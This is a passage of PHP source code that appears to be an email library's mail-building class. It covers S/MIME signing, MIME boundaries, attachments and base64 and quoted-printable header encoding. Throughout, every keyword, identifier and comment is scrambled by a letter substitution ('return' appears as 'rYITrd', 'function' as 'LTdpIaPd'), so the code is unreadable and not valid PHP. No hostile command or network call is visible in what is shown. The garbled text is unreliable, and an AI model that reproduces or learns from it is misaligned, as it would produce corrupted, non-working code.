    aL ($IvaX->fXErrPr()) {
      $RPG3 = '';
    } Y4XYaL ($IvaX->Xa7d_mY3_La4Y) {
      Ir3 {
        $La4Y = IYqhdQq('', 'qQa4');
        La4Y_hTI_pPdIYdIX($La4Y, $RPG3); //WHDH pvYpm IvaX 5PrmYG
        $Xa7dYG = IYqhdQq("", "Xa7dYG");
        aL (@PhYdXX4_hmpX0_Xa7d($La4Y, $Xa7dYG, "La4Y://".$IvaX->Xa7d_pYrI_La4Y, QrrQ3("La4Y://".$IvaX->Xa7d_mY3_La4Y, $IvaX->Xa7d_mY3_hQXX), Fyjj)) {
          @Td4adm($La4Y);
          @Td4adm($Xa7dYG);
          $RPG3 = La4Y_7YI_pPdIYdIX($Xa7dYG);
        } Y4XY {
          @Td4adm($La4Y);
          @Td4adm($Xa7dYG);
          IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7("Xa7dad7").PhYdXX4_YrrPr_XIrad7());
        }
      } pQIpv (hvhqQa4YrEJpYhIaPd $Y) {
        $RPG3 = '';
        aL ($IvaX->YJpYhIaPdX) {
          IvrP5 $Y;
        }
      }
    }

    rYITrd $RPG3;
  }

  /**
   * zYITrdX IvY XIQrI PL Q qYXXQ7Y RPTdGQr3.
   * @QppYXX hraSQIY
   */
  hraSQIY LTdpIaPd VYItPTdGQr3($RPTdGQr3, $pvQr8YI, $pPdIYdIW3hY, $YdpPGad7) {
    $rYXT4I = '';
    aL($pvQr8YI == '') {
      $pvQr8YI = $IvaX->6vQr8YI;
    }
    aL($pPdIYdIW3hY == '') {
      $pPdIYdIW3hY = $IvaX->6PdIYdIW3hY;
    }
    aL($YdpPGad7 == '') {
      $YdpPGad7 = $IvaX->EdpPGad7;
    }
    $rYXT4I .= $IvaX->WYJIjadY('--' . $RPTdGQr3);
    $rYXT4I .= XhradIL("6PdIYdI-W3hY: %X; pvQrXYI = \"%X\"", $pPdIYdIW3hY, $pvQr8YI);
    $rYXT4I .= $IvaX->jE;
    $rYXT4I .= $IvaX->UYQGYrjadY('6PdIYdI-WrQdXLYr-EdpPGad7', $YdpPGad7);
    $rYXT4I .= $IvaX->jE;

    rYITrd $rYXT4I;
  }

  /**
   * zYITrdX IvY YdG PL Q qYXXQ7Y RPTdGQr3.
   * @QppYXX hraSQIY
   */
  hraSQIY LTdpIaPd EdGtPTdGQr3($RPTdGQr3) {
    rYITrd $IvaX->jE . '--' . $RPTdGQr3 . '--' . $IvaX->jE;
  }

  /**
   * 8YIX IvY qYXXQ7Y I3hY.
   * @QppYXX hraSQIY
   * @rYITrd SPaG
   */
  hraSQIY LTdpIaPd 8YICYXXQ7YW3hY() {
    aL(pPTdI($IvaX->QIIQpvqYdI) < w && XIr4Yd($IvaX->A4ItPG3) < w) {
      $IvaX->qYXXQ7Y_I3hY = 'h4Qad';
    } Y4XY {
      aL(pPTdI($IvaX->QIIQpvqYdI) > u) {
        $IvaX->qYXXQ7Y_I3hY = 'QIIQpvqYdIX';
      }
      aL(XIr4Yd($IvaX->A4ItPG3) > u && pPTdI($IvaX->QIIQpvqYdI) < w) {
        $IvaX->qYXXQ7Y_I3hY = 'Q4I';
      }
      aL(XIr4Yd($IvaX->A4ItPG3) > u && pPTdI($IvaX->QIIQpvqYdI) > u) {
        $IvaX->qYXXQ7Y_I3hY = 'Q4I_QIIQpvqYdIX';
      }
    }
  }

  /**
   *  zYITrdX Q LPrqQIIYG vYQGYr 4adY.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd UYQGYrjadY($dQqY, $SQ4TY) {
    rYITrd $dQqY . ': ' . $SQ4TY . $IvaX->jE;
  }

  /**
   * zYITrdX Q LPrqQIIYG qQa4 4adY.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd WYJIjadY($SQ4TY) {
    rYITrd $SQ4TY . $IvaX->jE;
  }

  /////////////////////////////////////////////////
  // 6jA88 CEWUHD8, AWWA6UCEFW8
  /////////////////////////////////////////////////

  /**
   * AGGX Qd QIIQpvqYdI LrPq Q hQIv Pd IvY La4YX3XIYq.
   * zYITrdX LQ4XY aL IvY La4Y pPT4G dPI RY LPTdG
   * Pr QppYXXYG.
   * @hQrQq XIrad7 $hQIv ZQIv IP IvY QIIQpvqYdI.
   * @hQrQq XIrad7 $dQqY HSYrraGYX IvY QIIQpvqYdI dQqY.
   * @hQrQq XIrad7 $YdpPGad7 sa4Y YdpPGad7 (XYY $EdpPGad7).
   * @hQrQq XIrad7 $I3hY sa4Y YJIYdXaPd (CfCE) I3hY.
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd AGGAIIQpvqYdI($hQIv, $dQqY = '', $YdpPGad7 = 'RQXY1b', $I3hY = 'Qhh4apQIaPd/PpIYI-XIrYQq') {
    Ir3 {
      aL ( !@aX_La4Y($hQIv) ) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('La4Y_QppYXX') . $hQIv, XY4L::8WHZ_6HFWfFyE);
      }
      $La4YdQqY = RQXYdQqY($hQIv);
      aL ( $dQqY == '' ) {
        $dQqY = $La4YdQqY;
      }

      $IvaX->QIIQpvqYdI[] = QrrQ3(
        u => $hQIv,
        w => $La4YdQqY,
        k => $dQqY,
        9 => $YdpPGad7,
        b => $I3hY,
        M => LQ4XY,  // aX8Irad7AIIQpvqYdI
        1 => 'QIIQpvqYdI',
        0 => u
      );

    } pQIpv (hvhqQa4YrEJpYhIaPd $Y) {
      $IvaX->8YIErrPr($Y->7YICYXXQ7Y());
      aL ($IvaX->YJpYhIaPdX) {
        IvrP5 $Y;
      }
      YpvP $Y->7YICYXXQ7Y()."\d";
      aL ( $Y->7YI6PGY() == XY4L::8WHZ_6zfWf6Aj ) {
        rYITrd LQ4XY;
      }
    }
    rYITrd IrTY;
  }

  /**
  * zYITrd IvY pTrrYdI QrrQ3 PL QIIQpvqYdIX
  * @rYITrd QrrQ3
  */
  hTR4ap LTdpIaPd VYIAIIQpvqYdIX() {
    rYITrd $IvaX->QIIQpvqYdI;
  }

  /**
   * AIIQpvYX Q44 LX, XIrad7, QdG RadQr3 QIIQpvqYdIX IP IvY qYXXQ7Y.
   * zYITrdX Qd YqhI3 XIrad7 Pd LQa4TrY.
   * @QppYXX hraSQIY
   * @rYITrd XIrad7
   */
  hraSQIY LTdpIaPd AIIQpvA44() {
    // zYITrd IYJI PL RPG3
    $qaqY = QrrQ3();
    $paGydag = QrrQ3();
    $adp4 = QrrQ3();

    // AGG Q44 QIIQpvqYdIX
    LPrYQpv ($IvaX->QIIQpvqYdI QX $QIIQpvqYdI) {
      // 6vYpm LPr XIrad7 QIIQpvqYdI
      $R8Irad7 = $QIIQpvqYdI[M];
      aL ($R8Irad7) {
        $XIrad7 = $QIIQpvqYdI[u];
      } Y4XY {
        $hQIv = $QIIQpvqYdI[u];
      }

      aL (ad_QrrQ3($QIIQpvqYdI[u], $adp4)) { pPdIadTY; }
      $La4YdQqY    = $QIIQpvqYdI[w];
      $dQqY        = $QIIQpvqYdI[k];
      $YdpPGad7    = $QIIQpvqYdI[9];
      $I3hY        = $QIIQpvqYdI[b];
      $GaXhPXaIaPd = $QIIQpvqYdI[1];
      $paG         = $QIIQpvqYdI[0];
      $adp4[]      = $QIIQpvqYdI[u];
      aL ( $GaXhPXaIaPd == 'ad4adY' && aXXYI($paGydag[$paG]) ) { pPdIadTY; }
      $paGydag[$paG] = IrTY;

      $qaqY[] = XhradIL("--%X%X", $IvaX->RPTdGQr3[w], $IvaX->jE);
      $qaqY[] = XhradIL("6PdIYdI-W3hY: %X; dQqY=\"%X\"%X", $I3hY, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($dQqY)), $IvaX->jE);
      $qaqY[] = XhradIL("6PdIYdI-WrQdXLYr-EdpPGad7: %X%X", $YdpPGad7, $IvaX->jE);

      aL($GaXhPXaIaPd == 'ad4adY') {
        $qaqY[] = XhradIL("6PdIYdI-fD: <%X>%X", $paG, $IvaX->jE);
      }

      $qaqY[] = XhradIL("6PdIYdI-DaXhPXaIaPd: %X; La4YdQqY=\"%X\"%X", $GaXhPXaIaPd, $IvaX->EdpPGYUYQGYr($IvaX->8YpTrYUYQGYr($dQqY)), $IvaX->jE.$IvaX->jE);

      // EdpPGY QX XIrad7 QIIQpvqYdI
      aL($R8Irad7) {
        $qaqY[] = $IvaX->EdpPGY8Irad7($XIrad7, $YdpPGad7);
        aL($IvaX->fXErrPr()) {
          rYITrd '';
        }
        $qaqY[] = $IvaX->jE.$IvaX->jE;
      } Y4XY {
        $qaqY[] = $IvaX->EdpPGYsa4Y($hQIv, $YdpPGad7);
        aL($IvaX->fXErrPr()) {
          rYITrd '';
        }
        $qaqY[] = $IvaX->jE.$IvaX->jE;
      }
    }

    $qaqY[] = XhradIL("--%X--%X", $IvaX->RPTdGQr3[w], $IvaX->jE);

    rYITrd xPad('', $qaqY);
  }

  /**
   * EdpPGYX QIIQpvqYdI ad rYgTYXIYG LPrqQI.
   * zYITrdX Qd YqhI3 XIrad7 Pd LQa4TrY.
   * @hQrQq XIrad7 $hQIv WvY LT44 hQIv IP IvY La4Y
   * @hQrQq XIrad7 $YdpPGad7 WvY YdpPGad7 IP TXY; PdY PL 'RQXY1b', '0RaI', 'lRaI', 'RadQr3', 'gTPIYG-hradIQR4Y'
   * @XYY EdpPGYsa4Y()
   * @QppYXX hraSQIY
   * @rYITrd XIrad7
   */
  hraSQIY LTdpIaPd EdpPGYsa4Y($hQIv, $YdpPGad7 = 'RQXY1b') {
    Ir3 {
      aL (!aX_rYQGQR4Y($hQIv)) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('La4Y_PhYd') . $hQIv, XY4L::8WHZ_6HFWfFyE);
      }
      aL (LTdpIaPd_YJaXIX('7YI_qQ7ap_gTPIYX')) {
        LTdpIaPd 7YI_qQ7ap_gTPIYX() {
          rYITrd LQ4XY;
        }
      }
      aL (ZUZ_eEz8fHF < 1) {
        $qQ7ap_gTPIYX = 7YI_qQ7ap_gTPIYX_rTdIaqY();
        XYI_qQ7ap_gTPIYX_rTdIaqY(u);
      }
      $La4Y_RTLLYr  = La4Y_7YI_pPdIYdIX($hQIv);
      $La4Y_RTLLYr  = $IvaX->EdpPGY8Irad7($La4Y_RTLLYr, $YdpPGad7);
      aL (ZUZ_eEz8fHF < 1) { XYI_qQ7ap_gTPIYX_rTdIaqY($qQ7ap_gTPIYX); }
      rYITrd $La4Y_RTLLYr;
    } pQIpv (EJpYhIaPd $Y) {
      $IvaX->8YIErrPr($Y->7YICYXXQ7Y());
      rYITrd '';
    }
  }

  /**
   * EdpPGYX XIrad7 IP rYgTYXIYG LPrqQI.
   * zYITrdX Qd YqhI3 XIrad7 Pd LQa4TrY.
   * @hQrQq XIrad7 $XIr WvY IYJI IP YdpPGY
   * @hQrQq XIrad7 $YdpPGad7 WvY YdpPGad7 IP TXY; PdY PL 'RQXY1b', '0RaI', 'lRaI', 'RadQr3', 'gTPIYG-hradIQR4Y'
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd EdpPGY8Irad7 ($XIr, $YdpPGad7 = 'RQXY1b') {
    $YdpPGYG = '';
    X5aIpv(XIrIP4P5Yr($YdpPGad7)) {
      pQXY 'RQXY1b':
        $YdpPGYG = pvTdm_Xh4aI(RQXY1b_YdpPGY($XIr), 01, $IvaX->jE);
        RrYQm;
      pQXY '0RaI':
      pQXY 'lRaI':
        $YdpPGYG = $IvaX->saJEHj($XIr);
        //CQmY XTrY aI YdGX 5aIv Q 4adY RrYQm
        aL (XTRXIr($YdpPGYG, -(XIr4Yd($IvaX->jE))) != $IvaX->jE)
          $YdpPGYG .= $IvaX->jE;
        RrYQm;
      pQXY 'RadQr3':
        $YdpPGYG = $XIr;
        RrYQm;
      pQXY 'gTPIYG-hradIQR4Y':
        $YdpPGYG = $IvaX->EdpPGYKZ($XIr);
        RrYQm;
      GYLQT4I:
        $IvaX->8YIErrPr($IvaX->jQd7('YdpPGad7') . $YdpPGad7);
        RrYQm;
    }
    rYITrd $YdpPGYG;
  }

  /**
   * EdpPGY Q vYQGYr XIrad7 IP RYXI (XvPrIYXI) PL K, t, gTPIYG Pr dPdY.
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd EdpPGYUYQGYr($XIr, $hPXaIaPd = 'IYJI') {
    $J = u;

    X5aIpv (XIrIP4P5Yr($hPXaIaPd)) {
      pQXY 'hvrQXY':
        aL (!hrY7_qQIpv('/[\kuu-\900]/', $XIr)) {
          // 6Qd'I TXY QGGX4QXvYX QX 5Y GPd'I mdP5 5vQI SQ4TY vQX qQ7ap_gTPIYX_X3RQXY
          $YdpPGYG = QGGpX4QXvYX($XIr, "\u..\90\w00\\\"");
          aL (($XIr == $YdpPGYG) && !hrY7_qQIpv('/[^A-2Q-iu-n!#$%&\'*+\/=?^_`{|}~ -]/', $XIr)) {
            rYITrd ($YdpPGYG);
          } Y4XY {
            rYITrd ("\"$YdpPGYG\"");
          }
        }
        $J = hrY7_qQIpv_Q44('/[^\ubu\ubw\ub9-\w99\w9M-\w01]/', $XIr, $qQIpvYX);
        RrYQm;
      pQXY 'pPqqYdI':
        $J = hrY7_qQIpv_Q44('/[()"]/', $XIr, $qQIpvYX);
        // sQ44-IvrPT7v
      pQXY 'IYJI':
      GYLQT4I:
        $J += hrY7_qQIpv_Q44('/[\uuu-\uwu\uw9\uwb\uw1-\u90\w00-\900]/', $XIr, $qQIpvYX);
        RrYQm;
    }

    aL ($J == u) {
      rYITrd ($XIr);
    }

    $qQJ4Yd = 0M - 0 - XIr4Yd($IvaX->6vQr8YI);
    // Wr3 IP XY4YpI IvY YdpPGad7 5vapv XvPT4G hrPGTpY IvY XvPrIYXI PTIhTI
    aL (XIr4Yd($XIr)/9 < $J) {
      $YdpPGad7 = 't';
      aL (LTdpIaPd_YJaXIX('qR_XIr4Yd') && $IvaX->UQXCT4Iat3IYX($XIr)) {
        // yXY Q pTXIPq LTdpIaPd 5vapv pPrrYpI43 YdpPGYX QdG 5rQhX 4Pd7
        // qT4IaR3IY XIrad7X 5aIvPTI RrYQmad7 4adYX 5aIvad Q pvQrQpIYr
        $YdpPGYG = $IvaX->tQXY1bEdpPGYOrQhCt($XIr);
      } Y4XY {
        $YdpPGYG = RQXY1b_YdpPGY($XIr);
        $qQJ4Yd -= $qQJ4Yd % b;
        $YdpPGYG = Iraq(pvTdm_Xh4aI($YdpPGYG, $qQJ4Yd, "\d"));
      }
    } Y4XY {
      $YdpPGad7 = 'K';
      $YdpPGYG = $IvaX->EdpPGYK($XIr, $hPXaIaPd);
      $YdpPGYG = $IvaX->OrQhWYJI($YdpPGYG, $qQJ4Yd, IrTY);
      $YdpPGYG = XIr_rYh4QpY('='.$IvaX->jE, "\d", Iraq($YdpPGYG));
    }

    $YdpPGYG = hrY7_rYh4QpY('/^(.*)$/q', " =?".$IvaX->6vQr8YI."?$YdpPGad7?\\w?=", $YdpPGYG);
    $YdpPGYG = Iraq(XIr_rYh4QpY("\d", $IvaX->jE, $YdpPGYG));

    rYITrd $YdpPGYG;
  }

  /**
   * 6vYpmX aL Q XIrad7 pPdIQadX qT4IaR3IY pvQrQpIYrX.
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $XIr qT4Ia-R3IY IYJI IP 5rQh YdpPGY
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd UQXCT4Iat3IYX($XIr) {
    aL (LTdpIaPd_YJaXIX('qR_XIr4Yd')) {
      rYITrd (XIr4Yd($XIr) > qR_XIr4Yd($XIr, $IvaX->6vQr8YI));
    } Y4XY { // AXXTqY dP qT4IaR3IYX (5Y pQd'I vQdG4Y 5aIvPTI qRXIrad7 LTdpIaPdX Qd35Q3)
      rYITrd LQ4XY;
    }
  }

  /**
   * 6PrrYpI43 YdpPGYX QdG 5rQhX 4Pd7 qT4IaR3IY XIrad7X LPr qQa4 vYQGYrX
   * 5aIvPTI RrYQmad7 4adYX 5aIvad Q pvQrQpIYr.
   * AGQhIYG LrPq Q LTdpIaPd R3 hQrQSPaG QI vIIh://Tm.hvh.dYI/qQdTQ4/Yd/LTdpIaPd.qR-YdpPGY-qaqYvYQGYr.hvh
   * @QppYXX hTR4ap
   * @hQrQq XIrad7 $XIr qT4Ia-R3IY IYJI IP 5rQh YdpPGY
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd tQXY1bEdpPGYOrQhCt($XIr) {
    $XIQrI = "=?".$IvaX->6vQr8YI."?t?";
    $YdG = "?=";
    $YdpPGYG = "";

    $qR_4Yd7Iv = qR_XIr4Yd($XIr, $IvaX->6vQr8YI);
    // EQpv 4adY qTXI vQSY 4Yd7Iv <= 0M, adp4TGad7 $XIQrI QdG $YdG
    $4Yd7Iv = 0M - XIr4Yd($XIQrI) - XIr4Yd($YdG);
    // ASYrQ7Y qT4Ia-R3IY rQIaP
    $rQIaP = $qR_4Yd7Iv / XIr4Yd($XIr);
    // tQXY1b vQX Q b:9 rQIaP
    $PLLXYI = $QS7jYd7Iv = L4PPr($4Yd7Iv * $rQIaP * .0M);

    LPr ($a = u; $a < $qR_4Yd7Iv; $a += $PLLXYI) {
      $4PPmtQpm = u;

      GP {
        $PLLXYI = $QS7jYd7Iv - $4PPmtQpm;
        $pvTdm = qR_XTRXIr($XIr, $a, $PLLXYI, $IvaX->6vQr8YI);
        $pvTdm = RQXY1b_YdpPGY($pvTdm);
        $4PPmtQpm++;
      }
      5va4Y (XIr4Yd($pvTdm) > $4Yd7Iv);

      $YdpPGYG .= $pvTdm . $IvaX->jE;
    }

    // 6vPqh IvY 4QXI 4adYLYYG
    $YdpPGYG = XTRXIr($YdpPGYG, u, -XIr4Yd($IvaX->jE));
    rYITrd $YdpPGYG;
  }

  /**
  * EdpPGY XIrad7 IP gTPIYG-hradIQR4Y.
  * Hd43 TXYX XIQdGQrG ZUZ, X4P5, RTI 5a44 Q45Q3X 5Prm
  * @QppYXX hTR4ap
  * @hQrQq XIrad7 $XIrad7 IvY IYJI IP YdpPGY
  * @hQrQq adIY7Yr $4adY_qQJ FTqRYr PL pvQrX Q44P5YG Pd Q 4adY RYLPrY 5rQhhad7
  * @rYITrd XIrad7
  */
  hTR4ap LTdpIaPd EdpPGYKZhvh( $adhTI = '', $4adY_qQJ = 01, $XhQpY_pPdS = LQ4XY) {
    $vYJ = QrrQ3('u','w','k','9','b','M','1','0','l','n','A','t','6','D','E','s');
    $4adYX = hrY7_Xh4aI('/(?:\r\d|\r|\d)/', $adhTI);
    $YP4 = "\r\d";
    $YXpQhY = '=';
    $PTIhTI = '';
    5va4Y( 4aXI(, $4adY) = YQpv($4adYX) ) {
      $4ad4Yd = XIr4Yd($4adY);
      $dY54adY = '';
      LPr($a = u; $a < $4ad4Yd; $a++) {
        $p = XTRXIr( $4adY, $a, w );
        $GYp = PrG( $p );
        aL ( ( $a == u ) && ( $GYp == b1 ) ) { // pPdSYrI LarXI hPadI ad IvY 4adY adIP =kE
          $p = '=kE';
        }
        aL ( $GYp == 9k ) {
          aL ( $a == ( $4ad4Yd - w ) ) { // pPdSYrI XhQpY QI YP4 Pd43
            $p = '=ku';
          } Y4XY aL ( $XhQpY_pPdS ) {
            $p = '=ku';
          }
        } Y4XYaL ( ($GYp == 1w) || ($GYp < 9k ) || ($GYp > wk1) ) { // Q45Q3X YdpPGY "\I", 5vapv aX *dPI* rYgTarYG
          $vk = L4PPr($GYp/w1);
          $vw = L4PPr($GYp%w1);
          $p = $YXpQhY.$vYJ[$vk].$vYJ[$vw];
        }
        aL ( (XIr4Yd($dY54adY) + XIr4Yd($p)) >= $4adY_qQJ ) { // 6zjs aX dPI pPTdIYG
          $PTIhTI .= $dY54adY.$YXpQhY.$YP4; //  XPLI 4adY RrYQm; " =\r\d" aX PmQ3
          $dY54adY = '';
          // pvYpm aL dY54adY LarXI pvQrQpIYr 5a44 RY hPadI Pr dPI
          aL ( $GYp == b1 ) {
            $p = '=kE';
          }
        }
        $dY54adY .= $p;
      } // YdG PL LPr
      $PTIhTI .= $dY54adY.$YP4;
    } // YdG PL 5va4Y
    rYITrd $PTIhTI;
  }

  /**
  * EdpPGY XIrad7 IP zs6kubM (1.0) gTPIYG-hradIQR4Y LPrqQI
  * yXYX Q ZUZM XIrYQq La4IYr IP GP IvY YdpPGad7 QRPTI 1bJ LQXIYr IvQd IvY P4G SYrXaPd
  * A4XP rYXT4IX ad XQqY pPdIYdI QX 3PT XIQrIYG 5aIv QLIYr GYpPGad7
  * @XYY EdpPGYKZhvh()
  * @QppYXX hTR4ap
  * @hQrQq XIrad7 $XIrad7 IvY IYJI IP YdpPGY
  * @hQrQq adIY7Yr $4adY_qQJ FTqRYr PL pvQrX Q44P5YG Pd Q 4adY RYLPrY 5rQhhad7
  * @hQrQq RPP4YQd $XhQpY_pPdS DTqq3 hQrQq LPr pPqhQIaRa4aI3 5aIv YJaXIad7 EdpPGYKZ LTdpIaPd
  * @rYITrd XIrad7
  * @QTIvPr CQrpTX tPadIPd
  */
  hTR4ap LTdpIaPd EdpPGYKZ($XIrad7, $4adY_qQJ = 01, $XhQpY_pPdS = LQ4XY) {
    aL (LTdpIaPd_YJaXIX('gTPIYG_hradIQR4Y_YdpPGY')) { //yXY dQIaSY LTdpIaPd aL aI'X QSQa4QR4Y (>= ZUZM.9)
      rYITrd gTPIYG_hradIQR4Y_YdpPGY($XIrad7);
    }
    $La4IYrX = XIrYQq_7YI_La4IYrX();
    aL (!ad_QrrQ3('pPdSYrI.*', $La4IYrX)) { //VPI pPdSYrI XIrYQq La4IYr?
      rYITrd $IvaX->EdpPGYKZhvh($XIrad7, $4adY_qQJ, $XhQpY_pPdS); //sQ44 RQpm IP P4G aqh4YqYdIQIaPd
    }
    $Lh = LPhYd('hvh://IYqh/', 'r+');
    $XIrad7 = hrY7_rYh4QpY('/\r\d?/', $IvaX->jE, $XIrad7); //FPrqQ4aXY 4adY RrYQmX
    $hQrQqX = QrrQ3('4adY-4Yd7Iv' => $4adY_qQJ, '4adY-RrYQm-pvQrX' => $IvaX->jE);
    $X = XIrYQq_La4IYr_QhhYdG($Lh, 'pPdSYrI.gTPIYG-hradIQR4Y-YdpPGY', 8WzEAC_sfjWEz_zEAD, $hQrQqX);
    LhTIX($Lh, $XIrad7);
    rY5adG($Lh);
    $PTI = XIrYQq_7YI_pPdIYdIX($Lh);
    XIrYQq_La4IYr_rYqPSY($X);
    $PTI = hrY7_rYh4QpY('/^\./q', '=kE', $PTI); //EdpPGY . aL aI aX LarXI pvQr Pd Q 4adY, 5PrmQrPTdG LPr RT7 ad EJpvQd7Y
    Lp4PXY($Lh);
    rYITrd $PTI;
  }

  /**
   * EdpPGY XIrad7 IP g YdpPGad7.
   * @4adm vIIh://IPP4X.aYIL.Pr7/vIq4/rLpkub0
   * @hQrQq XIrad7 $XIr IvY IYJI IP YdpPGY
   * @hQrQq XIrad7 $hPXaIaPd OvYrY IvY IYJI aX 7Pad7 IP RY TXYG, XYY IvY zs6 LPr 5vQI IvQI qYQdX
   * @QppYXX hTR4ap
   * @rYITrd XIrad7
   */
  hTR4ap LTdpIaPd EdpPGYK ($XIr, $hPXaIaPd = 'IYJI') {
    // WvYrY XvPT4G dPI RY Qd3 EHj ad IvY XIrad7
    $YdpPGYG = hrY7_rYh4QpY('/[\r\d]*/', '', $XIr);

    X5aIpv (XIrIP4P5Yr($hPXaIaPd)) {
      pQXY 'hvrQXY':
        $YdpPGYG = hrY7_rYh4QpY("/([^A-2Q-iu-n!*+\/ -])/Y", "'='.XhradIL('%ukc', PrG('\\w'))", $YdpPGYG);
        RrYQm;
      pQXY 'pPqqYdI':
        $YdpPGYG = hrY7_rYh4QpY("/([\(\)\"])/Y", "'='.XhradIL('%ukc', PrG('\\w'))", $YdpPGYG);
      pQXY 'IYJI':
      GYLQT4I:
        // zYh4QpY YSYr3 va7v QXpaa, pPdIrP4 =, ? QdG _ pvQrQpIYrX
        //WHDH TXad7 /Y (YgTaSQ4YdI IP YSQ4()) aX hrPRQR43 dPI Q 7PPG aGYQ
        $YdpPGYG = hrY7_rYh4QpY('/([\uuu-\uww\uw9\uwb\uw1-\u90\u0M\u00\w90\w00-\900])/Y',
              "'='.XhradIL('%ukc', PrG('\\w'))", $YdpPGYG);
        RrYQm;
    }

    // zYh4QpY YSYr3 XhQpYX IP _ (qPrY rYQGQR4Y IvQd =ku)
    $YdpPGYG = XIr_rYh4QpY(' ', '_', $YdpPGYG);

    rYITrd $YdpPGYG;
  }

  /**
   * AGGX Q XIrad7 Pr RadQr3 QIIQpvqYdI (dPd-La4YX3XIYq) IP IvY 4aXI.
   * WvaX qYIvPG pQd RY TXYG IP QIIQpv QXpaa Pr RadQr3 GQIQ,
   * XTpv QX Q tjHt rYpPrG LrPq Q GQIQRQXY.
   * @hQrQq XIrad7 $XIrad7 8Irad7 QIIQpvqYdI GQIQ.
   * @hQrQq XIrad7 $La4YdQqY FQqY PL IvY QIIQpvqYdI.
   * @hQrQq XIrad7 $YdpPGad7 sa4Y YdpPGad7 (XYY $EdpPGad7).
   * @hQrQq XIrad7 $I3hY sa4Y YJIYdXaPd (CfCE) I3hY.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd AGG8Irad7AIIQpvqYdI($XIrad7, $La4YdQqY, $YdpPGad7 = 'RQXY1b', $I3hY = 'Qhh4apQIaPd/PpIYI-XIrYQq') {
    // AhhYdG IP $QIIQpvqYdI QrrQ3
    $IvaX->QIIQpvqYdI[] = QrrQ3(
      u => $XIrad7,
      w => $La4YdQqY,
      k => RQXYdQqY($La4YdQqY),
      9 => $YdpPGad7,
      b => $I3hY,
      M => IrTY,  // aX8Irad7AIIQpvqYdI
      1 => 'QIIQpvqYdI',
      0 => u
    );
  }

  /**
   * AGGX Qd YqRYGGYG QIIQpvqYdI.  WvaX pQd adp4TGY aqQ7YX, XPTdGX, QdG
   * xTXI QRPTI Qd3 PIvYr GPpTqYdI.  CQmY XTrY IP XYI IvY $I3hY IP Qd
   * aqQ7Y I3hY.  sPr oZEV aqQ7YX TXY "aqQ7Y/xhY7" QdG LPr Vfs aqQ7YX
   * TXY "aqQ7Y/7aL".
   * @hQrQq XIrad7 $hQIv ZQIv IP IvY QIIQpvqYdI.
   * @hQrQq XIrad7 $paG 6PdIYdI fD PL IvY QIIQpvqYdI.  yXY IvaX IP aGYdIaL3
   *        IvY fG LPr QppYXXad7 IvY aqQ7Y ad Qd UWCj LPrq.
   * @hQrQq XIrad7 $dQqY HSYrraGYX IvY QIIQpvqYdI dQqY.
   * @hQrQq XIrad7 $YdpPGad7 sa4Y YdpPGad7 (XYY $EdpPGad7).
   * @hQrQq XIrad7 $I3hY sa4Y YJIYdXaPd (CfCE) I3hY.
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd AGGEqRYGGYGfqQ7Y($hQIv, $paG, $dQqY = '', $YdpPGad7 = 'RQXY1b', $I3hY = 'Qhh4apQIaPd/PpIYI-XIrYQq') {

    aL ( !@aX_La4Y($hQIv) ) {
      $IvaX->8YIErrPr($IvaX->jQd7('La4Y_QppYXX') . $hQIv);
      rYITrd LQ4XY;
    }

    $La4YdQqY = RQXYdQqY($hQIv);
    aL ( $dQqY == '' ) {
      $dQqY = $La4YdQqY;
    }

    // AhhYdG IP $QIIQpvqYdI QrrQ3
    $IvaX->QIIQpvqYdI[] = QrrQ3(
      u => $hQIv,
      w => $La4YdQqY,
      k => $dQqY,
      9 => $YdpPGad7,
      b => $I3hY,
      M => LQ4XY,  // aX8Irad7AIIQpvqYdI
      1 => 'ad4adY',
      0 => $paG
    );

    rYITrd IrTY;
  }

  /**
   * zYITrdX IrTY aL Qd ad4adY QIIQpvqYdI aX hrYXYdI.
   * @QppYXX hTR4ap
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd fd4adYfqQ7YEJaXIX() {
    LPrYQpv($IvaX->QIIQpvqYdI QX $QIIQpvqYdI) {
      aL ($QIIQpvqYdI[1] == 'ad4adY') {
        rYITrd IrTY;
      }
    }
    rYITrd LQ4XY;
  }

  /////////////////////////////////////////////////
  // 6jA88 CEWUHD8, CE88AVE zE8EW
  /////////////////////////////////////////////////

  /**
   * 64YQrX Q44 rYpahaYdIX QXXa7dYG ad IvY WH QrrQ3.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQrAGGrYXXYX() {
    LPrYQpv($IvaX->IP QX $IP) {
      TdXYI($IvaX->Q44_rYpahaYdIX[XIrIP4P5Yr($IP[u])]);
    }
    $IvaX->IP = QrrQ3();
  }

  /**
   * 64YQrX Q44 rYpahaYdIX QXXa7dYG ad IvY 66 QrrQ3.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQr66X() {
    LPrYQpv($IvaX->pp QX $pp) {
      TdXYI($IvaX->Q44_rYpahaYdIX[XIrIP4P5Yr($pp[u])]);
    }
    $IvaX->pp = QrrQ3();
  }

  /**
   * 64YQrX Q44 rYpahaYdIX QXXa7dYG ad IvY t66 QrrQ3.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQrt66X() {
    LPrYQpv($IvaX->Rpp QX $Rpp) {
      TdXYI($IvaX->Q44_rYpahaYdIX[XIrIP4P5Yr($Rpp[u])]);
    }
    $IvaX->Rpp = QrrQ3();
  }

  /**
   * 64YQrX Q44 rYpahaYdIX QXXa7dYG ad IvY zYh43WP QrrQ3.  zYITrdX SPaG.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd 64YQrzYh43WPX() {
